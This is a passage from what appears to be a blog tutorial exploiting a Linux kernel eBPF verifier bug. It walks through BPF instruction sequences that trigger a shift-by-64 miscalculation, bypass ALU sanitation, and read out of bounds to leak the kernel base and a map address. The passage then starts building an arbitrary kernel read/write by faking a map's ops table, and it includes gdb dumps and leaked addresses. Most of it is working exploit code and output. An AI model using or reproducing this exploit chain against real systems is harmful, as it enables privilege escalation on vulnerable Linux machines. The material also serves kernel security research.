<span class="n">BPF_ALU64_REG</span><span class="p">(</span><span class="n">BPF_RSH</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="n">BPF_REG_1</span><span class="p">),</span>
<span class="n">BPF_EXIT_INSN</span><span class="p">()</span>
</code></pre></div></div>
<p>And voila! we triggered the vuln.</p>

<h2 id="getting-a-leak">Getting a leak</h2>
<p>Now that we have a value that the verifier thinks is <code class="language-plaintext highlighter-rouge">0</code>, we can use it to perform pointer arithmetic to access out-of-bounds memory. Accessing oob memory of a map can be used to get a kernel leak. eBPF maps use the following struct:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">bpf_map</span> <span class="p">{</span>
	<span class="k">const</span> <span class="k">struct</span> <span class="n">bpf_map_ops</span> <span class="o">*</span><span class="n">ops</span> <span class="n">____cacheline_aligned</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">bpf_map</span> <span class="o">*</span><span class="n">inner_map_meta</span><span class="p">;</span>
<span class="cp">#ifdef CONFIG_SECURITY
</span>	<span class="kt">void</span> <span class="o">*</span><span class="n">security</span><span class="p">;</span>
<span class="cp">#endif
</span>	<span class="k">enum</span> <span class="n">bpf_map_type</span> <span class="n">map_type</span><span class="p">;</span>
	<span class="n">u32</span> <span class="n">key_size</span><span class="p">;</span>
	<span class="n">u32</span> <span class="n">value_size</span><span class="p">;</span>
	<span class="n">u32</span> <span class="n">max_entries</span><span class="p">;</span>
	<span class="n">u32</span> <span class="n">map_flags</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">spin_lock_off</span><span class="p">;</span> <span class="cm">/* &gt;=0 valid offset, &lt;0 error */</span>
	<span class="n">u32</span> <span class="n">id</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">numa_node</span><span class="p">;</span>
	<span class="n">u32</span> <span class="n">btf_key_type_id</span><span class="p">;</span>
	<span class="n">u32</span> <span class="n">btf_value_type_id</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">btf</span> <span class="o">*</span><span class="n">btf</span><span class="p">;</span>
<span class="cp">#ifdef CONFIG_MEMCG_KMEM
</span>	<span class="k">struct</span> <span class="n">mem_cgroup</span> <span class="o">*</span><span class="n">memcg</span><span class="p">;</span>
<span class="cp">#endif
</span>	<span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="n">BPF_OBJ_NAME_LEN</span><span class="p">];</span>
	<span class="n">u32</span> <span class="n">btf_vmlinux_value_type_id</span><span class="p">;</span>
	<span class="n">bool</span> <span class="n">bypass_spec_v1</span><span class="p">;</span>
	<span class="n">bool</span> <span class="n">frozen</span><span class="p">;</span> <span class="cm">/* write-once; write-protected by freeze_mutex */</span>
	<span class="n">atomic64_t</span> <span class="n">refcnt</span> <span class="n">____cacheline_aligned</span><span class="p">;</span>
	<span class="n">atomic64_t</span> <span class="n">usercnt</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">work_struct</span> <span class="n">work</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">mutex</span> <span class="n">freeze_mutex</span><span class="p">;</span>
	<span class="n">u64</span> <span class="n">writecnt</span><span class="p">;</span> <span class="cm">/* writable mmap cnt; protected by freeze_mutex */</span>

    <span class="c1">// map specific data</span>
<span class="p">};</span>
</code></pre></div></div>
<p>We will be using only Array maps (<code class="language-plaintext highlighter-rouge">BPF_MAP_TYPE_ARRAY</code>) in the exploit. Its struct is as follows:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">bpf_array</span> <span class="p">{</span>
	<span class="k">struct</span> <span class="n">bpf_map</span> <span class="n">map</span><span class="p">;</span>
	<span class="n">u32</span> <span class="n">elem_size</span><span class="p">;</span>
	<span class="n">u32</span> <span class="n">index_mask</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">bpf_array_aux</span> <span class="o">*</span><span class="n">aux</span><span class="p">;</span>
	<span class="k">union</span> <span class="p">{</span>
		<span class="kt">char</span> <span class="n">value</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="n">__aligned</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
		<span class="kt">void</span> <span class="o">*</span><span class="n">ptrs</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="n">__aligned</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
		<span class="kt">void</span> <span class="n">__percpu</span> <span class="o">*</span><span class="n">pptrs</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="n">__aligned</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
	<span class="p">};</span>
<span class="p">};</span>
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">ops</code> contains a kernel pointer since the allowed functions for a certain map type are declared at compile time.<br /> For Array map, <code class="language-plaintext highlighter-rouge">ops</code> will contain <code class="language-plaintext highlighter-rouge">array_map_ops</code>. We can use that to calculate kernel base.<br />
We will use a map with a key size of <code class="language-plaintext highlighter-rouge">4</code>, values size of <code class="language-plaintext highlighter-rouge">0x150</code> and max_entries <code class="language-plaintext highlighter-rouge">1</code>.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">oob_map_fd</span> <span class="o">=</span> <span class="n">bpf_map_create</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x150</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</code></pre></div></div>
<p>We will use <code class="language-plaintext highlighter-rouge">BPF_FUNC_map_lookup_elem</code> to get a pointer to the <code class="language-plaintext highlighter-rouge">value</code> correponding to the <code class="language-plaintext highlighter-rouge">key</code> (basically a pointer to start of user-controlled data).</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// load map_ptr_or_null in BPF_REG_0</span>
<span class="n">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
<span class="n">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_W</span><span class="p">,</span> <span class="n">BPF_REG_10</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span><span class="p">),</span>
<span class="n">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_6</span><span class="p">,</span> <span class="n">BPF_REG_1</span><span class="p">),</span>
<span class="n">BPF_LD_MAP_FD</span><span class="p">(</span><span class="n">BPF_REG_1</span><span class="p">,</span> <span class="n">oob_map_fd</span><span class="p">),</span>
<span class="n">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_2</span><span class="p">,</span> <span class="n">BPF_REG_10</span><span class="p">),</span>
<span class="n">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_ADD</span><span class="p">,</span> <span class="n">BPF_REG_2</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span><span class="p">),</span>
<span class="n">BPF_CALL_FUNC</span><span class="p">(</span><span class="n">BPF_FUNC_map_lookup_elem</span><span class="p">),</span>
<span class="c1">// returns map_ptr + 0x110 (offset of .values in bpf_array)</span>

<span class="c1">// convert map_ptr_or_null -&gt; map_ptr to perform further operations</span>
<span class="n">BPF_JMP_IMM</span><span class="p">(</span><span class="n">BPF_JNE</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
<span class="n">BPF_EXIT_INSN</span><span class="p">(),</span>
</code></pre></div></div>
<p>Now we use the verifier’s wrong assumption about the register with value of <code class="language-plaintext highlighter-rouge">0</code> (say <code class="language-plaintext highlighter-rouge">BPF_REG_0</code>) to perform pointer subtraction on it to move it back to start of <code class="language-plaintext highlighter-rouge">bpf_array</code> struct so we can read <code class="language-plaintext highlighter-rouge">ops</code> pointer.
To do that, we need to bypass ALU Sanitation also.<br />
Lucky for us, there’s an easy bypass here. Remember the <code class="language-plaintext highlighter-rouge">alu_limit = 0</code> issue?<br />
We will use that. Currently, the pointer returned by <code class="language-plaintext highlighter-rouge">map_lookup_elem</code> (say <code class="language-plaintext highlighter-rouge">data_ptr</code>, <code class="language-plaintext highlighter-rouge">BPF_REG_7</code>) is equal to <code class="language-plaintext highlighter-rouge">map_ptr + 0x110</code>. We move <code class="language-plaintext highlighter-rouge">0x110</code> into <code class="language-plaintext highlighter-rouge">BPF_REG_0</code> and trigger the vuln to make the verifier think it’s <code class="language-plaintext highlighter-rouge">0</code>, then we subtract <code class="language-plaintext highlighter-rouge">BPF_REG_0</code> from <code class="language-plaintext highlighter-rouge">data_ptr</code> to make it <code class="language-plaintext highlighter-rouge">map_ptr + 0x0</code>. The <code class="language-plaintext highlighter-rouge">alu_limit</code> calculated for this subtraction is <code class="language-plaintext highlighter-rouge">0</code> and the <code class="language-plaintext highlighter-rouge">alu_limit - 1</code> turns it into <code class="language-plaintext highlighter-rouge">0xffffffff</code> which lets us subtract <code class="language-plaintext highlighter-rouge">0x110</code> gracefully.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// trigger vuln and make eBPF think we are still map_ptr + 0x110</span>
<span class="c1">// but in reality we're map_ptr + 0x0</span>
<span class="n">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">),</span>
<span class="c1">// ALU Sanitation will set alu_limit = 0 but alu_limit - 1 will be used</span>
<span class="c1">// hence any 32-bit value can be used</span>
<span class="n">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mh">0x110</span><span class="p">),</span>
<span class="n">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_1</span><span class="p">,</span> <span class="mi">64</span><span class="p">),</span>
<span class="n">BPF_ALU64_REG</span><span class="p">(</span><span class="n">BPF_RSH</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="n">BPF_REG_1</span><span class="p">),</span> <span class="c1">// the bug</span>
<span class="n">BPF_ALU64_REG</span><span class="p">(</span><span class="n">BPF_SUB</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">),</span> <span class="c1">// map_ptr + 0x110 -&gt; map_ptr + 0x0</span>
</code></pre></div></div>
<p>Now we read <code class="language-plaintext highlighter-rouge">ops</code> and write it at <code class="language-plaintext highlighter-rouge">map_ptr + 0x110</code> to read it from userspace.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// load the ptr (kbase leak)</span>
<span class="n">BPF_LDX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_8</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
<span class="c1">// make map_ptr + 0x0 to map_ptr + 0x110</span>
<span class="n">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_ADD</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="mh">0x110</span><span class="p">),</span> 
<span class="c1">// write array_map_ops ptr to maps_ptr + 0x110</span>
<span class="n">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_8</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
<span class="n">BPF_EXIT_INSN</span><span class="p">(),</span>
</code></pre></div></div>
<p>And we get the kbase:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>array_map_ops: 0xffffffff820363a0
kbase: 0xffffffff81000000
</code></pre></div></div>
<p>When I stepped through program using gdb, I saw something interesting in map data:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  x/26gx 0xffff888004e23400   &lt;-- map_ptr
0xffff888004e23400:     0xffffffff820363a0      0x0000000000000000
0xffff888004e23410:     0x0000000000000000      0x0000000400000002
0xffff888004e23420:     0x0000000100000150      0xffffffea00000000
0xffff888004e23430:     0xffffffff00000001      0x0000000000000000
0xffff888004e23440:     0x0000000000000000      0xffff88800392b000
0xffff888004e23450:     0x0000000000000000      0x0000000000000000
0xffff888004e23460:     0x0000000000000000      0x0000000000000000
0xffff888004e23470:     0x0000000000000000      0x0000000000000000
0xffff888004e23480:     0x0000000000000002      0x0000000000000001
0xffff888004e23490:     0x0000000000000000      0x0000000000000000
0xffff888004e234a0:     0x0000000000000000      0x0000000000000000
0xffff888004e234b0:     0x0000000000000000      0x0000000000000000
0xffff888004e234c0:     0xffff888004e234c0      0xffff888004e234c0 &lt;-- a self-pointer
</code></pre></div></div>
<p>This is because of <code class="language-plaintext highlighter-rouge">bpf_map</code>’s member <code class="language-plaintext highlighter-rouge">work</code> (type <a href="https://elixir.bootlin.com/linux/v5.11/source/include/linux/workqueue.h#L102"><code class="language-plaintext highlighter-rouge">work_struct</code></a>). It contains a doubly-linked list (to keep track of bpf maps?). We can use it to leak <code class="language-plaintext highlighter-rouge">map_ptr</code>.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// map_ptr + 0x0 -&gt; map_ptr + 0xc0</span>
<span class="n">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_ADD</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">),</span>
<span class="c1">// load the ptr (heap leak)</span>
<span class="n">BPF_LDX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_9</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
<span class="c1">// make map_ptr + 0xc0 to map_ptr + 0x110</span>
<span class="n">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_ADD</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">),</span>
<span class="c1">// write *(map_ptr + 0xc0) to maps_ptr + 0x118</span>
<span class="n">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_9</span><span class="p">,</span> <span class="mi">8</span><span class="p">),</span>
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>array_map_ops: 0xffffffff820363a0
kbase: 0xffffffff81000000
map_ptr: 0xffff888004e1a800
</code></pre></div></div>
<p>Here’s the main function so far:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">oob_map_fd</span> <span class="o">=</span> <span class="n">bpf_map_create</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x150</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>

<span class="k">struct</span> <span class="n">bpf_insn</span> <span class="n">kleak_prog</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
    <span class="c1">// load map_ptr_or_null in BPF_REG_0</span>
    <span class="n">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
    <span class="n">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_W</span><span class="p">,</span> <span class="n">BPF_REG_10</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span><span class="p">),</span>
    <span class="n">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_6</span><span class="p">,</span> <span class="n">BPF_REG_1</span><span class="p">),</span>
    <span class="n">BPF_LD_MAP_FD</span><span class="p">(</span><span class="n">BPF_REG_1</span><span class="p">,</span> <span class="n">oob_map_fd</span><span class="p">),</span>
    <span class="n">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_2</span><span class="p">,</span> <span class="n">BPF_REG_10</span><span class="p">),</span>
    <span class="n">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_ADD</span><span class="p">,</span> <span class="n">BPF_REG_2</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span><span class="p">),</span>
    <span class="n">BPF_CALL_FUNC</span><span class="p">(</span><span class="n">BPF_FUNC_map_lookup_elem</span><span class="p">),</span>
    <span class="c1">// returns map_ptr + 0x110 (offset of .values in array_map)</span>

    <span class="c1">// map_ptr_or_null -&gt; map_ptr</span>
    <span class="n">BPF_JMP_IMM</span><span class="p">(</span><span class="n">BPF_JNE</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
    <span class="n">BPF_EXIT_INSN</span><span class="p">(),</span>

    <span class="c1">// trigger vuln and make eBPF think we are still map_ptr + 0x110</span>
    <span class="c1">// but in reality we're map_ptr + 0x0</span>
    <span class="n">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">),</span>
    <span class="c1">// ALU Sanitation will set alu_limit = 0 but alu_limit - 1 will be used</span>
    <span class="c1">// hence any 32-bit value can be used</span>
    <span class="n">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mh">0x110</span><span class="p">),</span>
    <span class="n">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_1</span><span class="p">,</span> <span class="mi">64</span><span class="p">),</span>
    <span class="n">BPF_ALU64_REG</span><span class="p">(</span><span class="n">BPF_RSH</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="n">BPF_REG_1</span><span class="p">),</span> <span class="c1">// the bug</span>
    <span class="n">BPF_ALU64_REG</span><span class="p">(</span><span class="n">BPF_SUB</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">),</span>
    <span class="n">BPF_LDX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_8</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span> <span class="c1">// load the ptr (kbase leak)</span>
    
    <span class="c1">// map_ptr + 0x0 -&gt; map_ptr + 0xc0</span>
    <span class="n">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_ADD</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">),</span>
    <span class="n">BPF_LDX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_9</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span> <span class="c1">// load the ptr (heap leak)</span>

    <span class="c1">// write the read ptr to map for reading it from userspace</span>
    <span class="c1">// make map_ptr + 0xc0 to map_ptr + 0x110</span>
    <span class="n">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_ADD</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">),</span> 
    <span class="c1">// write array_map_ops ptr to maps_ptr + 0x110</span>
    <span class="n">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_8</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
    <span class="c1">// write map_ptr + 0xc0 to maps_ptr + 0x118</span>
    <span class="n">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_9</span><span class="p">,</span> <span class="mi">8</span><span class="p">),</span>
    <span class="n">BPF_EXIT_INSN</span><span class="p">(),</span>
<span class="p">};</span>

<span class="n">run_bpf_prog</span><span class="p">(</span><span class="n">kleak_prog</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">kleak_prog</span><span class="p">)</span><span class="o">/</span><span class="k">sizeof</span><span class="p">(</span><span class="n">kleak_prog</span><span class="p">[</span><span class="mi">0</span><span class="p">]));</span>

<span class="kt">uint64_t</span> <span class="n">array_map_ops</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="n">oob_map_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="kt">uint64_t</span> <span class="n">map_ptr</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="n">oob_map_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xc0</span><span class="p">;</span>
<span class="kt">uint64_t</span> <span class="n">kbase</span> <span class="o">=</span> <span class="n">array_map_ops</span> <span class="o">-</span> <span class="n">ARRAY_MAP_OPS_OFFSET</span><span class="p">;</span>

<span class="n">printf</span><span class="p">(</span><span class="s">"array_map_ops: %p</span><span class="se">\n</span><span class="s">kbase: %p</span><span class="se">\n</span><span class="s">map_ptr: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">array_map_ops</span><span class="p">,</span> <span class="n">kbase</span><span class="p">,</span> <span class="n">map_ptr</span><span class="p">);</span>
</code></pre></div></div>

<h2 id="arbitrary-read--write">Arbitrary Read &amp; Write</h2>
<p>I found two methods for achieving this.<br />
One by Manfred Paul <a href="https://twitter.com/_manfp">@_manfp</a> decribed <a href="https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification">here</a>.<br />
One by R <a href="https://twitter.com/n0psledbyte">@n0psledbyte</a> showcased <a href="https://gist.github.com/d4em0n/b0320ce8a3a930ecca1aa9d014ba79ba">here</a>.</p>

<p>Manfred’s method is great for multiple kernels and allows doing multiple reads and writes with running new bpf programs, but needs two different programs for read and write.<br />
On other hand, R just makes a single program to overwrite <code class="language-plaintext highlighter-rouge">modprobe_path</code>.<br /></p>

<p>I wanted to make a single program which allows multiple reads/writes from userspace.
Here I present you a method to so. This method is NOT like Manfred method which can be easily used for multiple kernels. This method is reliant on some offsets but it sums up my knowledge of eBPF for now.<br /></p>

<p>To understand this, we need to know about a few things. Lets start.<br />
First off, since JIT is enabled in this kernel, the ebpf program will be jitted. When eBPF programs are jitted, the map functions they call, are converted to calls to those functions directly. This means that the jitted program will NOT use the <code class="language-plaintext highlighter-rouge">ops</code> value at runtime to find out the right function. The address of the function will be embedded in the code (according to <code class="language-plaintext highlighter-rouge">ops</code> at jit-time). Whereas, if the program is being interpreted, it will always retrieve the pointer from <code class="language-plaintext highlighter-rouge">ops</code>. <code class="language-plaintext highlighter-rouge">map_lookup_elem</code> is a special case, instead of embedding the function’s address into the code, a function name <code class="language-plaintext highlighter-rouge">map_gen_lookup</code> is used to generate equivalent eBPF instructions which will become part of the eBPF program (like the ALU Sanitation checks).<br />
Each map type has its own <code class="language-plaintext highlighter-rouge">map_gen_lookup</code>. R found that lookup functions for map type <code class="language-plaintext highlighter-rouge">BPF_MAP_TYPE_ARRAY_OF_MAPS</code> are a bit unique and useful for exploitation. Here’s the function:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="o">*</span><span class="nf">array_of_map_lookup_elem</span><span class="p">(</span><span class="k">struct</span> <span class="n">bpf_map</span> <span class="o">*</span><span class="n">map</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">key</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">bpf_map</span> <span class="o">**</span><span class="n">inner_map</span> <span class="o">=</span> <span class="n">array_map_lookup_elem</span><span class="p">(</span><span class="n">map</span><span class="p">,</span> <span class="n">key</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">inner_map</span><span class="p">)</span>
		<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>

	<span class="k">return</span> <span class="n">READ_ONCE</span><span class="p">(</span><span class="o">*</span><span class="n">inner_map</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p>It dereferences the value returned by simple <code class="language-plaintext highlighter-rouge">array_map_lookup_elem</code> which returns a pointer to value.<br />
You might be asking that, “What is your plan exactly?”<br />
My plan is to overwrite <code class="language-plaintext highlighter-rouge">ops</code> pointer of a map to a user-controlled value and fake a <code class="language-plaintext highlighter-rouge">bpf_map_ops</code> with custom <code class="language-plaintext highlighter-rouge">array_of_map_gen_lookup</code>. Then make a program use the map to inline the dereferencing and use that to read/write arbitrary values in kernel.<br />
The eBPF verifier thinks that <code class="language-plaintext highlighter-rouge">map_lookup_elem</code> returns a pointer to a <code class="language-plaintext highlighter-rouge">map_value</code> but this will make the pointer user controlled (since the user controls the data of the map and it dereferences it). So, it will let us read/write values from/to it since it think we’re reading/writing from/to the map values.<br />
eBPF verifier uses <code class="language-plaintext highlighter-rouge">bpf_func_proto</code> for checks on functions calls.</p>

<h3 id="overwrite-ops">Overwrite Ops</h3>
<p>We will overwrite <code class="language-plaintext highlighter-rouge">ops</code> of <code class="language-plaintext highlighter-rouge">arb_read_write_map</code>. But first we need a fake <code class="language-plaintext highlighter-rouge">bpf_map_ops</code>, we will use <code class="language-plaintext highlighter-rouge">oob_map</code> for this. We will only write <code class="language-plaintext highlighter-rouge">map_update_elem</code>, <code class="language-plaintext highlighter-rouge">map_lookup_elem</code> and <code class="language-plaintext highlighter-rouge">map_gen_lookup</code>.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_6</span><span class="p">,</span> <span class="n">BPF_REG_1</span><span class="p">),</span>
<span class="n">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
<span class="n">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_W</span><span class="p">,</span> <span class="n">BPF_REG_10</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span><span class="p">),</span>
<span class="n">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_2</span><span class="p">,</span> <span class="n">BPF_REG_10</span><span class="p">),</span>
<span class="n">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_ADD</span><span class="p">,</span> <span class="n">BPF_REG_2</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span><span class="p">),</span>
<span class="n">BPF_LD_MAP_FD</span><span class="p">(</span><span class="n">BPF_REG_1</span><span class="p">,</span> <span class="n">oob_map_fd</span><span class="p">),</span>
<span class="n">BPF_CALL_FUNC</span><span class="p">(</span><span class="n">BPF_FUNC_map_lookup_elem</span><span class="p">),</span>

<span class="n">BPF_JMP_IMM</span><span class="p">(</span><span class="n">BPF_JNE</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
<span class="n">BPF_EXIT_INSN</span><span class="p">(),</span>

<span class="c1">// setup fake bpf_map_ops struct with only needed values</span>
<span class="n">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">),</span> <span class="c1">// move map_ptr + 0x110</span>
<span class="n">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="n">kbase</span> <span class="o">+</span> <span class="n">ARRAY_MAP_UPDATE_ELEM_OFFSET</span><span class="p">),</span>
<span class="n">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">12</span> <span class="o">*</span> <span class="mi">8</span><span class="p">),</span>

<span class="n">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="n">kbase</span> <span class="o">+</span> <span class="n">ARRAY_MAP_LOOKUP_ELEM_OFFSET</span><span class="p">),</span>
<span class="n">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">11</span> <span class="o">*</span> <span class="mi">8</span><span class="p">),</span>

<span class="n">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0x20e9c0</span><span class="p">),</span> <span class="c1">// array_of_map_gen_lookup</span>
<span class="n">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">19</span> <span class="o">*</span> <span class="mi">8</span><span class="p">),</span>
</code></pre></div></div>
